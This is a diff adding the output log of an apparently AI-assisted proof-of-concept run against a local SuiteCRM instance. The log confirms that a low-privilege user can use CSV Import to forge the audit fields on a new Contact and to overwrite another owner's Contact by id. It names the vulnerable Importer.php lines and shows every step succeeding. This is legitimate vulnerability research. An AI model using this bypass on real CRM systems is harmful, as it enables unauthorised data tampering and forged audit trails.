@@ -1,0 +1,26 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-092/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-092/../.venv
+========================================================================
+VULN-092: CSV Import: audit-forgery (mass assignment) + update-by-id IDOR
+target: http://localhost:33116
+========================================================================
+[INFO] sink(a): modules/Import/Importer.php:518-571 (auto-stamp flag flips)
+[INFO] sink(b): modules/Import/Importer.php:355-388 (update-by-id, no row ACL)
+[SETUP] admin web + legacy REST session
+[SETUP] create low-priv RegularUser L, restrict Contacts 'edit' to ACL_ALLOW_OWNER
+[OK] low-priv user mod_b9edd623 id=2271f820-bee1-4b26-950c-7f1025e266cc; role 466dd1c5-4e4f-48e9-a455-c78799da4373 = Contacts edit OWNER-only
+[SETUP] admin creates victim Contact V (assigned_user_id=admin) -- outside L's edit ACL
+[OK] victim Contact V=a869ea2e-694f-43a0-a484-02a9b7b71767 (Victim92_4b1e89ab) owned by admin
+[STEP] baseline: L attempts normal set_entry edit on V (same ACLAccess('save') gate as EditView)
+[INFO] baseline set_entry response: {'name': 'Access Denied', 'number': 40, 'description': 'You do not have access'}
+[INFO] V's last_name after baseline attempt: [{'last_name': 'Victim92_4b1e89ab'}] (expect unchanged='Victim92_4b1e89ab') -- baseline_blocked(api)=True baseline_effective(db)=True
+[STEP] PART(a): L imports a CSV creating a NEW Contact, forging created_by=modified_user_id=<admin id> date_entered='2010-01-01 00:00:00'
+[INFO] (a) Confirm scraped file_name='upload://IMPORT_Contact_2271f820-bee1-4b26-950c-7f1025e266cc'; Step4 -> HTTP 200
+[PROOF] (a) new Contact row: [{'id': '729f973e-fd06-411f-b4ac-fb8dadbf5a41', 'created_by': '1', 'date_entered': '2010-01-01 00:00:00', 'modified_user_id': '1'}]
+[INFO] (a) forged created_by=True modified_user_id=True date_entered=True -> part_a_ok=True (real importer was L, id=2271f820-bee1-4b26-950c-7f1025e266cc, NOT admin id=1)
+[STEP] PART(b): L imports import_type=update CSV mapping id=<V> last_name='Overwritten92_37e6a652' -- V is owned by admin, and L's Role denies L ordinary edit access to it
+[INFO] (b) Confirm scraped file_name='upload://IMPORT_Contact_2271f820-bee1-4b26-950c-7f1025e266cc'; Step4 -> HTTP 200
+[PROOF] (b) victim Contact V after import-update: [{'id': 'a869ea2e-694f-43a0-a484-02a9b7b71767', 'last_name': 'Overwritten92_37e6a652', 'assigned_user_id': '1'}]
+[INFO] (b) V's last_name now == forged value? True (still owned by admin, assigned_user_id unchanged: True)
+[OK] L (Contacts edit=OWNER-only, verified blocked from normally editing V) used CSV Import to (a) create a new Contact whose created_by/modified_user_id/date_entered are entirely attacker-chosen (admin's identity, 2010 timestamp), and (b) overwrite victim Contact V's last_name by id despite owning neither -- both bypass the SAME Role restriction that a normal Save correctly enforces.
+==> VULN-092: CONFIRMED — (a) new Contact created_by=modified_user_id=1.. date_entered=2010-01-01 (forged); (b) V=a869ea2e.. last_name overwritten to 'Overwritten92_37e6a652' by non-owning L (Role-bypassed)
